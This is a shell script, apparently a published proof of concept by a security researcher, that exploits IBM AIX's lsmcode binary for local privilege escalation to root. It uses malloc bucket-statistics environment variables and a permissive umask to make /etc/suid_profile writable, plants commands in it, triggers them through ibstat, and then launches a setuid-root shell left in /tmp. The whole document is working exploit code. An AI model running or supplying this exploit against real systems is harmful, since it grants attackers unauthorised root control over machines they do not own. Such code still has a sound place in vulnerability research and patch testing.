#!/usr/bin/sh
#
# AIX lsmcode local root exploit.
#
# Affected: AIX 6.1/7.1/7.2.0.2
#
# Blog post URL: https://rhinosecuritylabs.com/2016/11/03/unix-nostalgia-hunting-zeroday-vulnerabilities-ibm-aix/
#
# lqueryroot.sh by @hxmonsegur [2016 //RSL]

ROOTSHELL=/tmp/shell-$(od -N4 -tu /dev/random | awk 'NR==1 {print $2} {}')

if [ ! -x "/usr/sbin/lsmcode" ]; then
    echo "[-] lsmcode isn't executable. Exploit failed."
    exit 1
fi

echo "[*] [lsmcode] AIX 6.1/7.1/7.2.0.2 Privilege escalation by @hxmonsegur //RSL"
echo "[*] Current id: `/usr/bin/id`"
echo "[*] Exporting variables"

MALLOCOPTIONS=buckets
MALLOCBUCKETS=number_of_buckets:8,bucket_statistics:/etc/suid_profile
export MALLOCOPTIONS MALLOCBUCKETS

echo "[*] Setting umask to 000"
umask 000

echo "[*] Executing vulnerable binary [lsmcode]"
/usr/sbin/lsmcode -c >/dev/null 2>&1

if [ ! -e "/etc/suid_profile" ]; then
    echo "[-] /etc/suid_profile does not exist and exploit failed."
    exit 1
fi

echo "[*] Cleaning up /etc/suid_profile"
echo > /etc/suid_profile

echo "[*] Preparing escalation"
cat << EOF >/etc/suid_profile
cp /bin/ksh $ROOTSHELL
/usr/bin/syscall setreuid 0 0
chown root:system $ROOTSHELL
chmod 6755 $ROOTSHELL
rm /etc/suid_profile
EOF

echo "[*] Cleaning up environment variables"
unset MALLOCBUCKETS MALLOCOPTIONS

echo "[*] Escalating"
/usr/bin/ibstat -a >/dev/null 2>&1

if [ ! -e "$ROOTSHELL" ]; then
    echo "[-] Rootshell does not exist and exploit failed."
    exit 1
fi

echo "[*] Executing rootshell"
$ROOTSHELL
echo "[*] Make sure to remove $ROOTSHELL"